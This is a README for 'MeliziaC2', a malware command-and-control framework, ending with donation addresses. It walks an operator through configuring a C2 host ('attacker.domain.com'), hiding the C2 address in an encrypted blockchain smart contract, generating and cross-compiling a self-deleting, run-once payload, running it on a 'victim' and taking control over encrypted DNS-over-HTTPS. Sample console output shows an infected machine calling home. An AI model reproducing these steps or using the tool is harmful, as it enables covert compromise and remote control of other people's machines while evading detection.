# MeliziaC2
DNS over HTTPS targeted malware (only runs once)

<p align="center">
  <img src="./logo.jpg" width="500">
</p>

## Key Features
- [x] Auto-delete malware on failure
- [x] Fully encrypted (per victim RSA key) DoH (DNS-over-HTTPS) communication
- [x] Malware only runs once!   

## Diagram

![diagram](./melizia_diagram.svg)


## Usage Steps


###### 0 - Edit contract_generator.py file
```
modify C2ServerIP variable:
C2ServerIP = "attacker.domain.com"
```

###### 1 - Generate and deploy smart contract (contains the AES encrypted DNS address of server)
```
attacker_machine@ThreatActor:$ python3 contract_generator.py 
[...]
Calculating keccak from :: ImTWdbREqskoawYAXzEB()

Contract address :: 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6
Encrypted C2 address :: weTq1JD5gpk4Guv/9wTXXhcXgxI+0V+aQPKly7F0rdM=
Contract key :: 9o2goajTJ3ivI+DLB+rRzw==
Generated contract variable name :: ImTWdbREqskoawYAXzEB
Contract keccak :: 7941b5a6

gen_payload primaryServerIP:port 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6 9o2goajTJ3ivI+DLB+rRzw== 7941b5a6
```

###### 2 - Generate payload using the returned parameters
```
attacker_stager_server@Stager:$ python3 server_rust.py 
Server running!
> gen_payload stagerServerPublicIP:stagerServerExposedPort(1337 by default) 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6 9o2goajTJ3ivI+DLB+rRzw== 7941b5a6
Smart contract address :: 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6
Smart contract Keccak :: 7941b5a6
Generated payload with hash :: b'8822a96ba043c606b16ede401cb4a22f2a57c63214311c4ed21f5c705a5d7687'

> 
```

###### 3 - Compile payload
```
attacker_stager_server@Stager:~/Desktop/babagola/migrate$ cargo build --release --target=x86_64-unknown-linux-musl
[...]
warning: `migrate` (bin "migrate") generated 147 warnings
    Finished release [optimized] target(s) in 0.18s
warning: the following packages contain code that will be rejected by a future version of Rust: rustc-serialize v0.3.24
note: to see what the problems were, use the option `--future-incompat-report`, or run `cargo report future-incompatibilities --id 1051`
```

###### 4 - run (Victim)
```
user@Ubuntu:$ ./malware 
[debug information]
```

##### 5 - control!
```
threatactor@C2Server:~/C2_Melizia$ sudo python3.10 c2.py 
sudo: unable to resolve host TestingC2: Resource temporarily unavailable
 Melizia C2 
Pwned by trololo gang! kek kek keke kekw
- "SYSADMIN VOCÊ ESTÁ SENDO HIPNOTIZADO, ESQUEÇA QUE ESSA OWNADA EXISTIU"
        |) /\ |\ | /`  |
        |) \/ | \| \]  .
          __________         |) /\ |\ | /`  |
         /________ /|        |) \/ | \| \]  .
        |   X|I   | |
        |    |    | | |) /\ |\ | /`  |
        |IX  * III| | |) \/ | \| \]  .
        |    |    | |
        |____VI___| |         |) /\ |\ | /`  |
        |    /    | |         |) \/ | \| \]  .
        |   /     | |
        |  /      | |     |) /\ |\ | /`  |
        |( )      | |     |) \/ | \| \]  .
        |_________|/
                     |) /\ |\ | /`  |
                     |) \/ | \| \]  .


Ctrl+C is disabled! please use "exit" to exit from Melizia
Use "help" to see the available commands!
[!] DNS Server started

(Melizia)> A spaceship arrived!
"92994c589f860bab7af687fc3525d3de445812f52e951f5cf2d04432751a1b8c" Called home!
```

##### 6 - anddd, the artifact only runs once! (attempt to run the same artifact)
```
[Victim]

user@Ubuntu:$ ./target/x86_64-unknown-linux-musl/release/migrate 
user@Ubuntu:$ ./target/x86_64-unknown-linux-musl/release/migrate 
-bash: ./target/x86_64-unknown-linux-musl/release/migrate: No such file or directory <- Unlink

[Stager]
user@Ubuntu:~/Desktop/babagola$ python3 server_rust.py 

Server running!
> gen_payload 127.0.0.1:1337 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79 wiDt52uxNO7X7iUB8v0THw== b100ca9f                                                                                                  
Smart contract address :: 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79
Smart contract Keccak :: b100ca9f
Generated payload with hash :: b'67d6f46082e7ab5a48864d8e887bf571d1dca03161084392d1edf1738e03fdb6'

[Valid Victim]
> 127.0.0.1:46390 - ce0fba743a0694c32b5d3051c801c1518d0ecf719aa12e89da7ec3a133eb894f
Records: b'Yo/W/UQkmZ8etNrjiHCJC7EIWP9It2V3r1AWDaPnqx4='

New client incomming! preparing the missiles to attack :: ('127.0.0.1', 46390)
Sending smart contract address :: 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79

[Invalid Victim]
127.0.0.1:38478 - ce0fba743a0694c32b5d3051c801c1518d0ecf719aa12e89da7ec3a133eb894f
```

## Compilation
###### Static compile
```
rustup target add x86_64-unknown-linux-musl
cargo build --release --target=x86_64-unknown-linux-musl

or (windows)

rustup target add x86_64-pc-windows-gnu
cargo build --release --target=x86_64-pc-windows-gnu
```

# Donate!
```
Pix:
997f8e1c-5ea4-42d8-9a52-2d1a852e4274

https://nubank.com.br/pagar/sqtrd/oGVMf6g6Pa

Cripto
Direct:
BTC
1ACguGNLXik3sKYShtEuUX4ahYuM3yPFQq

MATIC
0x3b1699bbd7f67db0987ebef0f5f7b00c12fefddf

ETH
0x3b1699bbd7f67db0987ebef0f5f7b00c12fefddf

Metamask:
0x30f2F62FD0700af80Deb70D520f07deE9D411a33

XMR
83dsNXwoxmX54CNrv6WrB1dJeiyttgBZM2JFvUh43MMrDghfZmfcsB7cGywVL1X69YQBcMsxm8mbdJhEdzCjgdaETKawxFK

SOL
2DsFcwmKtqCCS2WhVM2FCt4LJa18ugk5o26sarbhcqnR

All the currencies are supported!
https://nowpayments.io/donation/demoni3864
```

